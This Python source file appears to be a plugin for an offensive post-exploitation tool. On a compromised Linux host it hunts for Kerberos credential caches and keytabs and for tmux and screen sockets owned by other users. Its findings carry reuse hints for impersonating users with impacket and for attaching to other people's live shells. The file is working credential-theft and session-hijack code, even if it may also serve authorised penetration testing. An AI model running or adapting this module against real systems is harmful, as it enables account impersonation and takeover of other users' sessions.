"""Kerberos credential material + live tmux/screen sessions — cheap, high-value
Linux loot reap missed. A ccache/keytab impersonates its owner (KRB5CCNAME); an
unowned tmux/screen socket is a foothold-to-shell with no creds at all.
"""
from __future__ import annotations

from ...models import Finding
from ..base import Module, register


@register
class KerberosSessions(Module):
    name = "kerberos_sessions"

    def triggers(self, ctx) -> bool:
        return ctx.os == "linux"

    def collect(self, session):
        return self._kerberos(session) + self._live_sessions(session)

    def _kerberos(self, session):
        out = []
        cmd = ("ls -1 /tmp/krb5cc_* 2>/dev/null; echo \"$KRB5CCNAME\"; "
               "find /tmp /var/tmp /etc /var/lib/sss/db -maxdepth 3 "
               r"\( -name 'krb5cc_*' -o -name '*.keytab' -o -name 'krb5.keytab' \) "
               "2>/dev/null | head -n 40")
        seen = set()
        for line in session.exec(cmd, timeout=30).stdout.splitlines():
            p = line.strip()
            if p.startswith("FILE:"):
                p = p[5:]
            if not p or p in seen:
                continue
            seen.add(p)
            out.append(Finding(
                type="credential", severity="high",
                title=f"Kerberos credential material: {p}",
                detail="export KRB5CCNAME=<ccache> / klist -k <keytab>; reuse with impacket",
                source_module=self.name))
        return out

    def _live_sessions(self, session):
        out = []
        cur = session.exec("id -u 2>/dev/null", timeout=10).out.strip()
        socks = session.exec(
            "find /tmp/tmux-* /run/screen /var/run/screen -maxdepth 2 2>/dev/null "
            "| head -n 40", timeout=20).stdout
        for line in socks.splitlines():
            p = line.strip()
            if not p:
                continue
            owner = session.exec(f"stat -c '%u' {p} 2>/dev/null", timeout=10).out.strip()
            other = bool(owner) and owner != cur
            hint = "tmux -S <sock> attach" if "tmux" in p else "screen -x <owner>/<sock>"
            out.append(Finding(
                type="misconfig", severity="high" if other else "low",
                title=f"Live multiplexer socket: {p}",
                detail=f"owner uid={owner or '?'} — attach with: {hint}",
                source_module=self.name))
        return out
